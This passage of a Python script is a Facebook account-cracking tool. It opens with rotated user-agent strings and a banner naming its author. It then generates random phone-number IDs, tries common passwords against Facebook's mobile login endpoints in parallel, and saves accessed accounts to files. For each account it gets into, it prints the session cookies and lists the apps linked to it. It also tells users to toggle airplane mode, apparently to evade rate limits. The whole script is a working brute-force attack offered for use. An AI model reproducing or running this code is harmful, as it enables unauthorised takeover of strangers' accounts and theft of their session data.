"Dalvik/2.1.0 (Linux; U; Android 10; Orange Neva leaf Build/QP1A.190711.020)",
"Mozilla/5.0 (Linux; Android 10; Nokia 7 plus) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41) [ip:185.212.69.203]",
"Mozilla/5.0 (Linux; Android 8.0.0; SAMSUNG SM-A520F) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/17.0 Chrome/96.0.4664.104 Mobile Safari/537.36 [ip:37.162.85.147]",
"Mozilla/5.0 (Linux; Android 10; ART-L29; HMSCore 6.5.1.301) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.4.306 Mobile Safari/537.36 [ip:37.161.163.238]",
"samsung/SM-A325F (Linux;Android 12)",
"Mozilla/5.0 (Linux; Android 10; LM-K410) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Mobile Safari/537.36 [ip:37.163.26.220]",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 mailapp/6.2.9",
"Mozilla/5.0 (Linux; Android 6.0; iQ1452a) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; H8216) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 9; AMN-LX9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:93.36.181.34]",
"Mozilla/5.0 (Linux; Android 11; 21061110AG Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; CPH1951 Build/RP1A.200720.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 12; 6102H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
"AppleCoreMedia/1.0.0.19F77 (iPhone; U; CPU OS 15_5 like Mac OS X; ja_jp)",
"Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36 [ip:176.200.158.21]",
"Mozilla/5.0 (Linux; Android 11; RMX3201) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.125 Mobile Safari/537.36 [ip:80.182.147.126]",
"Mozilla/5.0 (Linux; Android 11; CPH2135 Build/RKQ1.201217.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 Instagram 241.1.0.18.114 Android (30/11; 320dpi; 720x1440; OPPO; CPH2135; OP4EFDL1; qcom; it_IT; 379517353)",
"Mozilla/5.0 (Linux; Android 8.0.0; RNE-L22 Build/HUAWEIRNE-L22; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 12; SM-A715F Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]"
"Mozilla/5.0 (Linux; Android 9; MRD-LX1 Build/HUAWEIMRD-LX1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; SM-T510 Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Safari/537.36",
"Mozilla/5.0 (Linux; Android 6.0.1; SM-G160N Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.78 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 11; CPH2135) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:79.21.142.104]",
"Mozilla/5.0 (Linux; U; Android 11; SM-A025F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 OPR/63.0.2254.62069",
"Mozilla/5.0 (Linux; Android 11; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Mobile Safari/537.36 (Ecosia android@101.0.4951.41)",
"Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [ip:2.199.59.131]"
"Mozilla/5.0 (Linux; Android 11; T775H Build/RKQ1.210107.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/102.0.5005.125 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 7.1.1; Lenovo TB-X704L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36",
"Mozilla/5.0 (Linux; Android 10; MAR-LX1A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36 [ip:176.200.2.198]",
"Mozilla/5.0 (Linux; Android 10; STK-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.70 Mobile Safari/537.36",
"Mozilla/5.0 (iPhone; CPU iPhone OS 14_8_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/18H107 [FBAN/FBIOS;FBDV/iPhone12,8;FBMD/iPhone;FBSN/iOS;FBSV/14.8.1;FBSS/2;FBID/phone;FBLC/en_GB;FBOP/5] [ip:77.32.59.126]",
"Mozilla/5.0 (Linux; Android 11; SM-A515F Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.70 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/372.1.0.23.107;]",
"Mozilla/5.0 (Linux; Android 11; M2101K6G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Mobile Safari/537.36 [ip:151.36.6.229]",
"Mozilla/5.0 (Linux; Android 9; FIG-LX1; HMSCore 6.5.1.301; GMSCore 22.24.13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.4.306 Mobile Safari/537.36",]
logo = """
\033[1;37;1m _______  _______  _______ _________ ______    
\033[1;37;1m(  ____ \(  ___  )(  ___  )\__   __/(  ___ \   
\033[1;37;1m| (    \/| (   ) || (   ) |   ) (   | (   ) )  
\033[1;37;1m| (_____ | (___) || |   | |   | |   | (__/ /   
\033[1;37;1m(_____  )|  ___  || |   | |   | |   |  __ (    
\033[1;37;1m      ) || (   ) || | /\| |   | |   | (  \ \   
\033[1;37;1m/\____) || )   ( || (_\ \ |___) (___| )___) )  
\033[1;37;1m\_______)|/     \|(____\/_)\_______/|/ \___/   
\033[1;37;1m-----------------------------------------------
\t      \033[1;37m\033[1;41m BEST-FRND : ISHA-GULL \033[0m\033[1;37m
\033[1;37;1m-----------------------------------------------
\033[1;37;1m ▶ Author   : SAQIB MEHMOOD
\033[1;37;1m ▶ Facebook : www.facebook.com/Saqib.007
\033[1;37;1m ▶ Virson   : 5.0
\033[1;37;1m-----------------------------------------------"""  
loop = 0
oks = []
cps = []

   
def menu():
	os.system('clear')
	print(logo)
	print('[1] Random crack')
	print('[0] Exit')
	print(47*"-")
	opt = input('[?] Choose : ')
	if opt =='1':
		method()
	elif opt =='0':
		exit()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		menu()
		
def method():
	os.system('clear')
	print(logo)
	print('[1] Method1 Fast [\x1b[1;92mBest\x1b[1;97m] ')
	print('[2] Method2 Fast [\x1b[1;92mBest\x1b[1;97m] ')
	print('[3] Method3 Fast [\x1b[1;92mFast\x1b[1;97m] ')
	print('[0] Back')
	print(47*'-')
	opt = input('[?] Choose : ')
	if opt =='1':
		method1()
	elif opt =='2':
		method2()
	elif opt =='3':
		method3()
	elif opt =='0':
		menu()
	else:
		print('\n\033[1;31mChoose valid option\033[0;97m')
		method()

def cek_apk(session,coki):
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(47*"-")
		print(f"\r{G}[•] Active Apps Not Found")
	else:
		print(f"\r{G}[•] Active Apps Or Websites")
		for i in range(len(game)):
			print(f"\r %s[%s] %s %s"%(G,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),G))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
	sop = BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	if len(game)==0:
		print(f"\r{G}[•] Expired Apps Not Found")
		print(47*"-")
	else:
		print(f"\r{G}[•] Expired Apps or Website")
		for i in range(len(game)):
			print(f"\r%s!%s! %s %s"%(G,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),G))
		else:
			print(f'\r')

def method1():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Indian Enter Four Digit Code (993455)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [kode, kode+guru, '786786']
			yaari.submit(mcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
	
def mcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global syed
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mISHA-SAQIB\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			ua = random.choice(syed)
			free_fb = session.get('https://free.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority': 'free.facebook.com',
			'method': 'GET',
			'path': '/?_rdc=1&_rdr',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding': 'gzip, deflate, br',
			'accept-language': 'en-US,en;q=0.9',
			'cookie': 'sb=72h5Yfy3MPZu-fDS2fHlQNJK; datr=72h5Yfu_775zGtKAFn2seoJ4; m_pixel_ratio=1; wd=452x625; fr=0QYoHFb8AwdGkSnGI.AWVhMUNQwRp9q2irEbXYtgplDaw.BiqZOT.5r.AAA.0.0.Bi-LPO.AWXQItjIZdU',
			'dnt': '1',
			'referer': 'https://www.google.com/',
			'sec-ch-ua': '".Not/A)Brand";v="99", "Avast Secure Browser";v="103", "Chromium";v="103"',
			'sec-ch-ua-mobile': '?0',
			'sec-ch-ua-platform': '"Windows"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'cross-site',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': ua}
			lo = session.post('https://free.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[SAQIB-OK] '+cid+' | '+ps+'\033[1;32m')
				cek_apk(session,coki)
				print(47*"\033[1;97m-");print("\033[1;97m[•] Cookie:\033[1;92m"+coki);print(47*"\033[1;97m-")
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[ISHA-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def method2():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Indian Enter Four Digit Code (993455)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [kode, kode+guru, '786786']
			yaari.submit(fcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
	
def fcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global syed
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mISHA-SAQIB\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			ua = random.choice(syed)
			free_fb = session.get('https://mbasic.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'mbasic.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': ua}
			lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[SAQIB-OK] '+cid+' | '+ps+'\033[1;32m')
				cek_apk(session,coki)
				print(47*"\033[1;97m-");print("\033[1;97m[•] Cookie:\033[1;92m"+coki);print(47*"\033[1;97m-")
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[ISHA-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass

def method3():
	user=[]
	os.system('clear');print(logo)
	print('[+] For Indian Enter Four Digit Code (993455)')
	print(47*'-')
	kode = input('[?] Input Code : ')
	print(47*'-')
	limit = int(input('[?] How many numbers do you want to add : '))
	for nmbr in range(limit):
		nmp = ''.join(random.choice(string.digits) for _ in range(4))
		user.append(nmp)
	with ThreadPool(max_workers=30) as yaari:
		os.system('clear')
		print(logo)
		tl = str(len(user))
		print('[+] Total Ids : \033[1;92m'+tl)
		print('\033[1;37;1m[$] Brute Has been started...(\033[1;94mIndia\033[1;97m)');print(47*"-");print('    USE FLIGHT (\033[1;91mAIRPLANE\033[1;97m) MODE BEFORE USE');print(47*"-")
		for guru in user:
			uid = kode+guru
			pwx = [kode, kode+guru]
			yaari.submit(mbcrack,uid,pwx,tl)
	print(47*"-")
	print('[✓] Crack process has been completed')
	print('[?] Ids saved in ok.txt,cp.txt')
	print(47*"-")
	input('Press Inter To Back Menu')
	menu()
	
def mbcrack(uid,pwx,tl):
	#print(user)
	global loop
	global cps
	global oks
	global syed
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;92mISHA-SAQIB\033[1;97m] [%s/%s] [\033[1;92mOK\033[1;97m:-\033[1;92m%s\033[1;97m] [\033[1;91mCP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
			sys.stdout.flush()
			ua = random.choice(syed)
			free_fb = session.get('https://m.facebook.com').text
			log_data = {
				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
			"try_number":"0",
			"unrecognized_tries":"0",
			"email":uid,
			"pass":ps,
			"login":"Log In"}
			header_freefb = {'authority':'m.facebook.com',
			'method': 'POST',
			'scheme': 'https',
			'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
			'accept-encoding':'utf-8','accept-language': 'en-US,en;q=0.9',
			'cache-control': 'max-age=0',
			'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="101"',
			'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"',
			'sec-fetch-dest': 'document',
			'sec-fetch-mode': 'navigate',
			'sec-fetch-site': 'none',
			'sec-fetch-user': '?1',
			'upgrade-insecure-requests': '1',
			'user-agent': ua}
			lo = session.post('https://m.facebook.com/login/device-based/regular/login/?refsrc=deprecated&amp;lwv=100&amp;refid=8',data=log_data,headers=header_freefb).text
			log_cookies=session.cookies.get_dict().keys()
			#print(iid+'|'+pws+'|'+str(log_cookies))
			if 'c_user' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[7:22]
				print('\033[1;92m[SAQIB-OK] '+cid+' | '+ps+'\033[1;32m')
				cek_apk(session,coki)
				print(47*"\033[1;97m-");print("\033[1;97m[•] Cookie:\033[1;92m"+coki);print(47*"\033[1;97m-")
				open('ok.txt', 'a').write(cid+' | '+ps+'\n')
				oks.append(cid)
				break
			elif 'checkpoint' in log_cookies:
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[24:39]
				print('\033[1;91m[ISHA-CP] '+cid+' | '+ps+'\033[0;97m')
				open('cp.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
		loop+=1
	except:
		pass
if __name__=='__main__':
	os.system("git pull")
	menu()
